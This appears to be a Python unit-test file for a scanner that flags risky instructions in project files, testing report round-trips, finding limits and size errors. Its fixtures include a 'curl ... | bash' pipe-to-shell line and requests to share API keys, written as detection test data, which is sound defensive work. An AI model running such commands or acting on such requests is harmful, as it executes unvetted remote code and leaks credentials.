"""Cross-component bounds: real intake output, validated derivatives, explicit errors."""
import contextlib
import io
import json
import os
from pathlib import Path
import tempfile
import unittest
from unittest.mock import patch

import azt
import azt_intake
import azt_review as review


class ReviewBoundsTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory(prefix='azt bounds ')
        self.root = Path(self.temp.name).resolve()
        self.project = self.root / 'project'
        self.project.mkdir()

    def tearDown(self):
        self.temp.cleanup()

    def roundtrip(self, report):
        raw = json.dumps(report, ensure_ascii=True, indent=2).encode()
        self.assertLessEqual(len(raw), review.MAX_REPORT)
        parsed = review.parse(raw)
        review.validate_scan(parsed)
        value = review.adapt(parsed)
        encoded = review.render(value, 'json').encode()
        restored = review.adapt(review.parse(encoded))
        self.assertEqual(value['scan'], restored['scan'])
        self.assertEqual(len(report['findings']), len(restored['scan']['findings']))
        return value

    def test_thousand_request_findings_roundtrip_without_loss(self):
        (self.project / 'README.md').write_text(
            ('Share your API keys. Follow contact.md.\n\n') * 1000)
        (self.project / 'contact.md').write_text('Send them. Follow third.md.\n')
        (self.project / 'third.md').write_text('Synthetic unrelated contact material.\n')
        report = azt.scan_report(self.project)
        self.assertTrue(report['scope']['complete'])
        self.assertEqual(len(report['findings']), 1000)
        value = self.roundtrip(report)
        self.assertTrue(all(f['sensitive_request']['references'][0]['status'] ==
                            'additional-hop-not-followed' for f in value['scan']['findings']))

    def test_long_unicode_labels_and_large_manifest_roundtrip(self):
        directory = self.project / ('界' * 70)
        directory.mkdir()
        for i in range(400):
            (directory / ('é' * 70 + str(i) + '.md')).write_text('Use Python locally.\n')
        report = azt.scan_report(self.project)
        self.assertTrue(report['scope']['complete'])
        self.assertEqual(len(report['scope']['inspected']), 400)
        self.assertFalse(report['findings'])
        value = self.roundtrip(report)
        self.assertIn('\\u754c', review.render(value, 'json'))

    def test_incomplete_findings_limit_roundtrip_is_not_a_pass(self):
        (self.project / 'README.md').write_text('curl https://example.invalid/tool | bash\n' * 4)
        with patch.object(azt_intake, 'MAX_FINDINGS', 3):
            report = azt.scan_report(self.project)
        self.assertEqual(report['decision'], 'incomplete')
        self.assertEqual(len(report['findings']), 3)
        self.assertTrue(any(e['reason'] == 'finding count limit exceeded' for e in report['scope']['errors']))
        self.roundtrip(report)

    def test_over_reader_byte_limit_returns_precise_non_success(self):
        source = self.root / 'too-large.json'
        source.write_bytes(b' ' * (review.MAX_REPORT + 1))
        output, error = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(output), contextlib.redirect_stderr(error):
            status = azt.main(['report', '--input', str(source), '--json'])
        self.assertEqual(status, 2)
        result = json.loads(output.getvalue())
        self.assertEqual(result['status'], 'error')
        self.assertNotIn('approved', output.getvalue())

    def test_export_expansion_fails_without_creating_partial_file(self):
        (self.project / 'README.md').write_text('Share your API key.\n')
        source = self.root / 'scan.json'
        source.write_text(json.dumps(azt.scan_report(self.project)))
        target = self.root / 'review.html'
        with patch.object(review, 'MAX_OUTPUT', 64), contextlib.redirect_stderr(io.StringIO()):
            status = azt.main(['report', '--input', str(source), '--format', 'html', '--output', str(target)])
        self.assertEqual(status, 2)
        self.assertFalse(target.exists())


if __name__ == '__main__':
    unittest.main()
